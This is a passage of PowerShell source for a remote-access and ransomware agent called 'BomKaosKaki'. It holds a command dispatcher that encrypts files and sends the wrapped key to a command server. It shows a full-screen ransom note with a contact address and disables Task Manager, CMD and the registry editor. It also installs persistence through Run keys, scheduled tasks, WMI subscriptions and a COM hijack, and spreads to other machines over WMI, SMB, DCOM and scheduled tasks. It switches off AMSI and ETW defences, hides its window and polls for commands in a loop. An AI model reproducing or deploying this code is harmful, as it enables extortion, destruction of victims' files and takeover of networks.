                $files = Invoke-RansomEncrypt -TargetDir $targetDir -AESKeyBase64 $aesKey.Key -HMACKeyBase64 $hmacKey.Key
                
                # Encrypt AES Key with RSA Public Key
                $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
                $rsa.FromXmlString("<RSAKeyValue><Modulus>vT4pXQ+3JqVc6G8FJ6Yz5Lx7R9m2kP1wN4oZ8sA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>") # Provide full key in production
                $encKeyBytes = $rsa.Encrypt([System.Text.Encoding]::UTF8.GetBytes($aesKey.Key), $false)
                $encryptedAesKey = [Convert]::ToBase64String($encKeyBytes)
                
                Send-Exfil -DataType "ransomware_key" -Data @{
                    session_id    = $C2.SessionID
                    encrypted_key = $encryptedAesKey
                    aes_iv        = $aesKey.IV
                    hmac_key      = $hmacKey.Key
                    files_count   = $files.Count
                    target_dir    = $targetDir
                }
                "Encrypted $($files.Count) files in $targetDir"
            }
            catch { "ERROR: $_" }
        }
        "decrypt" {
            try {
                $parts = $args -split ' ', 2
                $targetDir = $parts[0]
                $keysJSON = $parts[1]  # JSON with aes_key, hmac_key
                $keys = $keysJSON | ConvertFrom-Json
                Invoke-RansomDecrypt -TargetDir $targetDir -AESKeyBase64 $keys.aes_key -HMACKeyBase64 $keys.hmac_key
                "Decrypted files in $targetDir"
            }
            catch { "ERROR: $_" }
        }
        "lockdown" {
            try {
                # Disable Task Manager
                New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -PropertyType DWord -Force
                # Disable CMD
                New-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 2 -PropertyType DWord -Force
                # Disable Registry Editor
                New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableRegistryTools" -Value 1 -PropertyType DWord -Force
                # Fullscreen popup
                Add-Type -AssemblyName System.Windows.Forms
                $form = New-Object System.Windows.Forms.Form
                $form.WindowState = 'Maximized'
                $form.FormBorderStyle = 'None'
                $form.TopMost = $true
                $form.ControlBox = $false
                $form.BackColor = 'Black'
                $label = New-Object System.Windows.Forms.Label
                $label.Text = "BOM KAOS KAKI`nYour files are encrypted. Contact bomkaos@onionmail.org"
                $label.ForeColor = 'Lime'
                $label.Font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
                $label.TextAlign = 'MiddleCenter'
                $label.Dock = 'Fill'
                $form.Controls.Add($label)
                $form.ShowDialog()
                Start-Job -ScriptBlock { param($f) $f.ShowDialog() } -ArgumentList $form
                "Lockdown activated"
            }
            catch { "ERROR: $_" }
        }
        "persist" {
            try {
                $currentPath = $MyInvocation.MyCommand.Path
                if (-not $currentPath) { $currentPath = Join-Path $C2.InstallDir "BomKaosKaki.ps1" }
                $results = Install-Persistence -PayloadPath $currentPath
                Send-Exfil -DataType "persistence" -Data @{ results = $results }
                ($results | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "clean" {
            try {
                $results = Invoke-CleanTraces
                ($results | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "lateral_discover" {
            try {
                $targets = Invoke-LateralDiscover
                Send-Exfil -DataType "lateral_targets" -Data @{ count = $targets.Count; targets = $targets }
                ($targets | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "lateral_wmi" {
            try {
                $parts = $args -split ' ', 2
                $result = Invoke-LateralWMI -Target $parts[0] -Command $parts[1]
                ($result | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "lateral_smb" {
            try {
                $parts = $args -split ' ', 2
                $result = Invoke-LateralSMB -Target $parts[0] -PayloadPath $parts[1]
                ($result | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "lateral_dcom" {
            try {
                $parts = $args -split ' ', 2
                $result = Invoke-LateralDCOM -Target $parts[0] -Command $parts[1]
                ($result | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "lateral_schtask" {
            try {
                $parts = $args -split ' ', 2
                $result = Invoke-LateralScheduledTask -Target $parts[0] -Command $parts[1]
                ($result | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "uninstall" {
            try {
                # Remove all persistence
                & {
                    # Remove Run key
                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BomKaosKaki" -Force -ErrorAction SilentlyContinue
                    # Remove RunOnce
                    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "BomKaosKaki" -Force -ErrorAction SilentlyContinue
                    # Remove Startup folder
                    Remove-Item "$([Environment]::GetFolderPath('Startup'))\BomKaosKaki.url" -Force -ErrorAction SilentlyContinue
                    # Remove scheduled tasks
                    Unregister-ScheduledTask -TaskName "BomKaosKakiUpdate" -Confirm:$false -ErrorAction SilentlyContinue
                    Unregister-ScheduledTask -TaskName "BomKaosKakiSvc" -Confirm:$false -ErrorAction SilentlyContinue
                    # Remove WMI subscriptions
                    Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='BomKaosFilter'" -ErrorAction SilentlyContinue | Remove-WmiObject
                    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='BomKaosConsumer'" -ErrorAction SilentlyContinue | Remove-WmiObject
                    # Remove service
                    Stop-Service "BomKaosHelper" -Force -ErrorAction SilentlyContinue
                    sc.exe delete BomKaosHelper 2>$null
                    # Remove COM hijack
                    Remove-Item "HKCU:\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}" -Recurse -Force -ErrorAction SilentlyContinue
                    # Clean traces
                    Invoke-CleanTraces | Out-Null
                }
                
                # Self-delete with delayed action
                $scriptPath = $MyInvocation.MyCommand.Path
                if (-not $scriptPath) { $scriptPath = Join-Path $C2.InstallDir "BomKaosKaki.ps1" }
                
                # Remove install directory
                Remove-Item $C2.InstallDir -Recurse -Force -ErrorAction SilentlyContinue
                
                "Uninstall complete. Self-deleting..."
                
                # PowerShell self-delete
                $deleteScript = @"
Start-Sleep -Seconds 2
Remove-Item '$scriptPath' -Force
"@
                $deleteScript | Out-File "$env:TEMP\cleanup.ps1" -Force
                Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\cleanup.ps1`"" -WindowStyle Hidden
                
                # Exit current process
                [System.Environment]::Exit(0)
            }
            catch { "ERROR: $_" }
        }
        "info" {
            $info = @{
                Hostname          = $env:COMPUTERNAME
                Username          = $env:USERNAME
                Domain            = $env:USERDOMAIN
                OS                = (Get-CimInstance Win32_OperatingSystem).Caption
                Architecture      = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
                RAM               = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB)
                CPU               = (Get-CimInstance Win32_Processor).Name
                InternalIP        = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPAddress[0]
                PublicIP          = (Invoke-WebRequest -Uri "http://ifconfig.me/ip" -UseBasicParsing -TimeoutSec 5).Content.Trim()
                Uptime            = "{0:N1} hours" -f (((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalHours)
                PowerShellVersion = $PSVersionTable.PSVersion.ToString()
                SessionID         = $C2.SessionID
                SandboxDetected   = (Test-Sandbox) -join '; '
                Group             = $C2.Group
            }
            ($info | Out-String)
        }
        "selfdestruct" {
            # Same as uninstall but more aggressive
            Invoke-CommandDispatcher -Command @{ command = "uninstall"; arguments = $args; id = $cmdID }
        }
        default {
            "Unknown command: $cmdName"
        }
    }
    
    # Send result back to C2
    Send-CommandResult -CommandID $cmdID -Result $result
}

# ============================================================================
# MAIN LOOP
# ============================================================================
function Start-Agent {
    # Anti-sandbox — check before doing anything
    $detections = Test-Sandbox
    if ($detections.Count -gt 0) {
        # Send heartbeat with sandbox detected, but continue for testing purposes
        Invoke-AntiSandboxSleep -Seconds 2
        # Usually it would return/exit here, but for testing we proceed
    }
    
    # Apply evasion
    Invoke-AMSIbypass
    Invoke-AMSIpatch
    Invoke-ETWbypass
    Disable-WLDP
    
    # Hide console if running in console mode
    try {
        $consoleHide = Add-Type -Name Hide -Namespace Win32 -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@ -PassThru
        $consoleHide::ShowWindow($consoleHide::GetConsoleWindow(), 0)  # SW_HIDE = 0
    }
    catch {}
    
    # Create install directory
    if (-not (Test-Path $C2.InstallDir)) { New-Item -ItemType Directory -Path $C2.InstallDir -Force | Out-Null }
    
    # Auto-Install Persistence
    $currentPath = $MyInvocation.MyCommand.Path
    if (-not $currentPath) { $currentPath = Join-Path $C2.InstallDir "BomKaosKaki.ps1" }
    Install-Persistence -PayloadPath $currentPath | Out-Null
    
    # Initial heartbeat
    Send-Heartbeat
    
    # Main polling loop
    while ($true) {
        try {
            # Get pending commands
            $response = Get-Commands
            
            if ($response -and $response.commands) {
                foreach ($cmd in $response.commands) {
                    # Execute command in background job for long-running tasks
                    if ($cmd.command -in @('keylog_start', 'exec', 'exec_powershell')) {
                        Start-Job -ScriptBlock {
                            param($c, $d)
                            Invoke-CommandDispatcher -Command $c
                        } -ArgumentList $cmd, $null
                    }
                    else {
                        Invoke-CommandDispatcher -Command $cmd
                    }
                }
            }
        }
        catch {
            # Silent fail — don't spam errors
        }
        
        # Smart sleep with jitter
        $sleepTime = $C2.PollInterval + ((Get-Random -Minimum 0 -Maximum ($C2.Jitter * 1000)) / 1000)
        Start-Sleep -Seconds $sleepTime
    }
}

# ============================================================================
# ENTRY POINT
# ============================================================================

# Check kill date
if ((Get-Date) -gt [DateTime]::ParseExact($C2.KillDate, "yyyy-MM-dd", $null)) {
    exit
}

# Start the agent
Start-Agent
